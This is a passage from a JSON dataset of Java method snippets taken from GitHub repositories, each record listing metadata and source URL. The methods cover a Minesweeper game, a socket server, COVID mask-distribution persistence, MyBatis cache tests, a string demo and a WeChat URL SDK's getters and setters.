cell\n\t\t\t\tif (!board[x][y].isMine()) continue;\n\t\t\t\t\n\t\t\t\t//iterate over neighboring cells\n\t\t\t\tfor (int y1 = Math.max(y-1, 0); y1 <= Math.min(y+1, board.length-1); y1++) {\n\t\t\t\t\tfor (int x1 = Math.max(x-1, 0); x1 <= Math.min(x+1, board[y].length-1); x1++) {\n\t\t\t\t\t\t//if not a mine, increase number of cell by 1\n\t\t\t\t\t\tif (!board[x1][y1].isMine()) {\n\t\t\t\t\t\t\tboard[x1][y1].setNumber(board[x1][y1].getNumber() + 1);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33259, "method_name": "calcMineCount", "class_name": "GameState", "params": ["int", "int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "\tprivate int calcMineCount(int dimensions, int difficulty) {\n\t\treturn dimensions * difficulty / (10 / 3);\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33260, "method_name": "getBoard", "class_name": "GameState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Cell", "snippet": "\tpublic Cell[][] getBoard() {\n\t\treturn board;\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33261, "method_name": "setBoard", "class_name": "GameState", "params": ["Cell"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setBoard(Cell[][] board) {\n\t\tthis.board = board;\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33262, "method_name": "getDimensions", "class_name": "GameState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getDimensions() {\n\t\treturn dimensions;\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33263, "method_name": "setDimensions", "class_name": "GameState", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDimensions(int dimensions) {\n\t\tthis.dimensions = dimensions;\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33264, "method_name": "getDifficulty", "class_name": "GameState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getDifficulty() {\n\t\treturn difficulty;\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33265, "method_name": "setDifficulty", "class_name": "GameState", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDifficulty(int difficulty) {\n\t\tthis.difficulty = difficulty;\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33266, "method_name": "getMines", "class_name": "GameState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getMines() {\n\t\treturn mines;\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33267, "method_name": "setMines", "class_name": "GameState", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setMines(int mines) {\n\t\tthis.mines = mines;\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33268, "method_name": "getMarked", "class_name": "GameState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getMarked() {\n\t\treturn marked;\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33269, "method_name": "setMarked", "class_name": "GameState", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setMarked(int marked) {\n\t\tthis.marked = marked;\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33270, "method_name": "isWon", "class_name": "GameState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isWon() {\n\t\treturn won;\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33271, "method_name": "setWon", "class_name": "GameState", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setWon(boolean won) {\n\t\tthis.won = won;\n\t\tif (won) revealAll();\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33272, "method_name": "revealAll", "class_name": "GameState", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void revealAll() {\n\t\tfor (int i = 0; i < board.length; i++) {\n\t\t\tfor (int j = 0; j < board[i].length; j++) {\n\t\t\t\tboard[i][j].setRevealed(true);\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33273, "method_name": "isLost", "class_name": "GameState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isLost() {\n\t\treturn lost;\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33274, "method_name": "setLost", "class_name": "GameState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setLost() {\n\t\tthis.lost = true;\n\t\trevealAll();\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33275, "method_name": "toString", "class_name": "GameState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\treturn \"JMine GameState [dim:\" + dimensions + \", diff:\" + difficulty + \"]\";\n\t}", "url": "https://raw.githubusercontent.com/bkis/JMines/master/src/idh/java/jmines/model/GameState.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33276, "method_name": "main", "class_name": "Server", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String ... args){\n    \n        try{\n            \n            ServerSocket serverSocket = new ServerSocket(9000);\n            boolean isStop = false;\n           \n            while(!isStop)\n            {\n            //accept waits for client requests and return a socket for connection\n                Socket clientSocket = serverSocket.accept();\n                \n                //Server can respond to multiple clients concurrently ,ie a Multithreaded server\n                //The accept will create a new socket object\n                ClientThread clientThread = new ClientThread(clientSocket);\n                clientThread.start();\n                \n            }        \n    }\n        catch(IOException i)\n        {\n            System.out.println(\"Port 9000 is already in use\");\n        }\n        catch(Exception e)\n        {\n            System.out.println(e.toString());\n        }\n    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/Server.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33277, "method_name": "recupererParDemandeurSurLes15DerniersJours", "class_name": "DistributionMasquePersistanceJdbc", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "List<DistributionMasque>", "snippet": "    public List<DistributionMasque> recupererParDemandeurSurLes15DerniersJours(String demandeur) {\n        LocalDateTime dateDistribution = LocalDateTime.now(clock).minusDays(15);\n        return distributionMasqueDatabaseRepository.findByDemandeurAndDateDistributionIsGreaterThanEqual(demandeur, dateDistribution)\n                .stream()\n                .map(distributionMasqueDatabaseMapper::toDistributionMasque)\n                .collect(toList());\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/infrastructure/database/DistributionMasquePersistanceJdbc.java", "stars": "5", "class_props": {"extends": null, "implements": ["DistributionMasquePersistance"], "modifiers": ["public"]}}, {"id": 33278, "method_name": "persister", "class_name": "DistributionMasquePersistanceJdbc", "params": ["List<DistributionMasque>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void persister(List<DistributionMasque> distributionMasques) {\n        distributionMasques.stream()\n                .map(distributionMasqueDatabaseMapper::toDistributionMasqueDatabase)\n                .forEach(d -> {\n                    distributionMasqueDatabaseRepository.save(d);\n                    produireLog(d);\n                });\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/infrastructure/database/DistributionMasquePersistanceJdbc.java", "stars": "5", "class_props": {"extends": null, "implements": ["DistributionMasquePersistance"], "modifiers": ["public"]}}, {"id": 33279, "method_name": "produireLog", "class_name": "DistributionMasquePersistanceJdbc", "params": ["DistributionMasqueDatabase"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void produireLog(DistributionMasqueDatabase distributionMasqueDatabase) {\n        try {\n            LOGGER.info(objectMapper.writeValueAsString(distributionMasqueDatabase));\n        } catch (JsonProcessingException e) {\n            LOGGER.error(\"Erreur lors de la production de log de distribution de masque\", e);\n        }\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/infrastructure/database/DistributionMasquePersistanceJdbc.java", "stars": "5", "class_props": {"extends": null, "implements": ["DistributionMasquePersistance"], "modifiers": ["public"]}}, {"id": 33280, "method_name": "testInitializing", "class_name": "CacheBuilderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testInitializing() {\n    InitializingCache cache = unwrap(new CacheBuilder(\"test\").implementation(InitializingCache.class).build());\n\n    Assertions.assertThat(cache.initialized).isTrue();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/mapping/CacheBuilderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33281, "method_name": "testInitializingFailure", "class_name": "CacheBuilderTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testInitializingFailure() {\n    when(() -> new CacheBuilder(\"test\").implementation(InitializingFailureCache.class).build());\n    then(caughtException()).isInstanceOf(CacheException.class)\n      .hasMessage(\"Failed cache initialization for 'test' on 'org.apache.ibatis.mapping.CacheBuilderTest$InitializingFailureCache'\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/mapping/CacheBuilderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33282, "method_name": "unwrap", "class_name": "CacheBuilderTest", "params": ["Cache"], "throws": null, "modifiers": ["private"], "return_type": "T", "snippet": "  private <T> T unwrap(Cache cache) {\n    Field field;\n    try {\n      field = cache.getClass().getDeclaredField(\"delegate\");\n    } catch (NoSuchFieldException e) {\n      throw new IllegalStateException(e);\n    }\n    try {\n      field.setAccessible(true);\n      return (T) field.get(cache);\n    } catch (IllegalAccessException e) {\n      throw new IllegalStateException(e);\n    } finally {\n      field.setAccessible(false);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/mapping/CacheBuilderTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33283, "method_name": "initialize", "class_name": "InitializingCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initialize() {\n      this.initialized = true;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/mapping/CacheBuilderTest.java", "stars": "15", "class_props": {"extends": "PerpetualCache", "implements": ["InitializingObject"], "modifiers": ["private", "static"]}}, {"id": 33284, "method_name": "initialize", "class_name": "InitializingFailureCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initialize() {\n      throw new IllegalStateException(\"error\");\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/mapping/CacheBuilderTest.java", "stars": "15", "class_props": {"extends": "PerpetualCache", "implements": ["InitializingObject"], "modifiers": ["private", "static"]}}, {"id": 33285, "method_name": "main", "class_name": "Zifuchuan", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args)\n\t{\n\t\tString greeting = \"hello\";   /*\u53d6\u5b50\u4e32*/\n\t\tString s = greeting.substring(0, 3);\n\t\tSystem.out.println(s);\n\t\tString expletive = \"Expensive\";    /*\u5b57\u7b26\u4e32\u62fc\u63a5*/\n\t\tString PG13 = \"delete\";\n\t\tString message = expletive + PG13;\n\t\tSystem.out.println(message);\n\t\tgreeting = greeting.substring(0, 3) + \"p!\";    /*\u4fee\u6539\u5b57\u7b26\u4e32*/\n\t\tSystem.out.println(greeting);\n\t\tSystem.out.println(s.equals(message));    /*\u68c0\u6d4b\u5b57\u7b26\u4e32\u662f\u5426\u76f8\u7b49*/ \n\t\tint n = greeting.length();    /*\u5b57\u7b26\u4e32\u957f\u5ea6\uff08\u4ee3\u7801\u5355\u5143\u6570\u91cf\uff09*/\n\t\tSystem.out.println(n);\n\t\tchar first = greeting.charAt(0);    /*\u8c03\u7528s.charAt(n)\u8fd4\u56de\u4f4d\u7f6en\u7684\u4ee3\u7801\u5355\u5143*/\n\t\tchar last = greeting.charAt(4);\n\t\tSystem.out.println(first);\n\t\tSystem.out.println(last);\n\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/ray/Zifuchuan.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33286, "method_name": "getId", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getId() {\n    return id;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33287, "method_name": "setId", "class_name": "UrlParam", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setId(String id) {\n    this.id = id;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33288, "method_name": "getAppid", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getAppid() {\n    return String.valueOf(appid);\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33289, "method_name": "setAppid", "class_name": "UrlParam", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setAppid(int appid) {\n    this.appid = appid;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33290, "method_name": "getAppkey", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getAppkey() {\n    return appkey;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33291, "method_name": "setAppkey", "class_name": "UrlParam", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setAppkey(String appkey) {\n    this.appkey = appkey;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33292, "method_name": "getUrl", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getUrl() {\n    return url;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33293, "method_name": "setUrl", "class_name": "UrlParam", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setUrl(String url) {\n    this.url = url;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33294, "method_name": "getRequestUri", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getRequestUri() {\n    return requestUri;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33295, "method_name": "setRequestUri", "class_name": "UrlParam", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setRequestUri(String requestUri) {\n    this.requestUri = requestUri;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33296, "method_name": "getDomain", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getDomain() {\n    return domain;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33297, "method_name": "setDomain", "class_name": "UrlParam", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setDomain(String domain) {\n    this.domain = domain;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33298, "method_name": "getType", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getType() {\n    return type;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33299, "method_name": "setType", "class_name": "UrlParam", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setType(String type) {\n    this.type = type;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33300, "method_name": "getStatus", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getStatus() {\n    return status == -1 ? \"\" : String.valueOf(this.status);\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33301, "method_name": "setStatus", "class_name": "UrlParam", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setStatus(int status) {\n    this.status = status;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33302, "method_name": "getFrequency", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getFrequency() {\n    return frequency == 0 ? \"\" : String.valueOf(frequency);\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33303, "method_name": "setFrequency", "class_name": "UrlParam", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setFrequency(int frequency) {\n    this.frequency = frequency;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33304, "method_name": "getLayerType", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getLayerType() {\n    return layerType;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33305, "method_name": "setLayerType", "class_name": "UrlParam", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setLayerType(String layerType) {\n    this.layerType = layerType;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33306, "method_name": "getIsMonitor", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getIsMonitor() {\n    return isMonitor == -1 ? \"\" : String.valueOf(isMonitor);\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33307, "method_name": "setIsMonitor", "class_name": "UrlParam", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setIsMonitor(int isMonitor) {\n    this.isMonitor = isMonitor;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33308, "method_name": "getCheckType", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getCheckType() {\n    return checkType;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33309, "method_name": "setCheckType", "class_name": "UrlParam", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setCheckType(String checkType) {\n    this.checkType = checkType;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33310, "method_name": "getEntryType", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getEntryType() {\n    return entryType;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33311, "method_name": "setEntryType", "class_name": "UrlParam", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setEntryType(String entryType) {\n    this.entryType = entryType;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33312, "method_name": "getVisitType", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getVisitType() {\n    return visitType;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33313, "method_name": "setVisitType", "class_name": "UrlParam", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setVisitType(String visitType) {\n    this.visitType = visitType;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33314, "method_name": "getIp", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getIp() {\n    return ip;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33315, "method_name": "setIp", "class_name": "UrlParam", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setIp(String ip) {\n    this.ip = ip;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33316, "method_name": "getNewLandDomainUrl", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getNewLandDomainUrl() {\n    return newLandDomainUrl;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33317, "method_name": "setNewLandDomainUrl", "class_name": "UrlParam", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UrlParam", "snippet": "  public UrlParam setNewLandDomainUrl(String newLandDomainUrl) {\n    this.newLandDomainUrl = newLandDomainUrl;\n    return this;\n  }", "url": "https://raw.githubusercontent.com/wechaturl/wechat_url_api_java_sdk/master/src/main/java/www/wechaturl/us/fangfeng/sdk/vo/UrlParam.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 33318, "method_name": "getGroupId", "class_name": "UrlParam", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getGroupId() {\n    return groupId == -1 ? \"\" : String.valueOf(groupId);\n  }", "url": 